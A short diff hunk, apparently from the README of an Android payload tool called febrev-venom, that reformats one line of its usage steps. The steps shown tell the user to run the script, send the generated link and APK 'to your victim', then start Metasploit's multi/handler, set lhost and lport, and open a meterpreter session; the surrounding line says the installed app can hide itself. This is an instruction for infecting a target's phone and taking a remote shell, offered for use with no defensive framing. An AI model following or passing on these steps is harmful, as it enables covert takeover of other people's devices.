@@ -28,7 +28,7 @@ ALSO THE APP CREATED BY MY TOOL CAN AUTOMATICALLY DISAPPEAR AFTER INSTALLING
    python3 febrev-venom.py
    
    
- **use the generated link(the best) + /<your apk> and send it to your victim 
+ #use the generated link(the best) + /<your apk> and send it to your victim 
  then start your msfconsole 
  use exploit/multi/handler
  then set lhost and lport and start the meterpreter session
